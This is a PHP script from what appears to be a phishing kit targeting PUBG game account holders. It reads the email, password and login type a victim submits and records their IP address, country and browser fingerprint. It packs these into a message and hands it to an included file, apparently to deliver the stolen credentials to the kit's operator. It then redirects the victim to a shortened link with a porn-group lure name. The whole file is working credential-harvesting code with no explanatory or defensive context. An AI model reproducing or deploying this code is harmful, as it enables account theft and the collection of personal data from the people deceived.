<?php
require 'detect.php';
include 'email.php';
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

if ($email == "" && $password == "")
{
  header("Location: index.php");
} else {

$msg = ("
[+]=========== ACC PUBG ===========[+]
[Login] = ".$login."
[Email]  = ".$email."
[Pass]  = ".$password."

[+]============System============[+]
[IP INFO] = http://www.geoiptool.com/?IP=".$IP."

[TIME/DATE] =".$times." / ".$date."

[Country] = ".$country."

[FINGERPRINT] = ".$useragent."
");

$url = $msg;include("api.php");

}


?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="REFRESH" content="0;url=https://bit.ly/GrupBokep_2021">
</head>
<body>
</body>
</html>
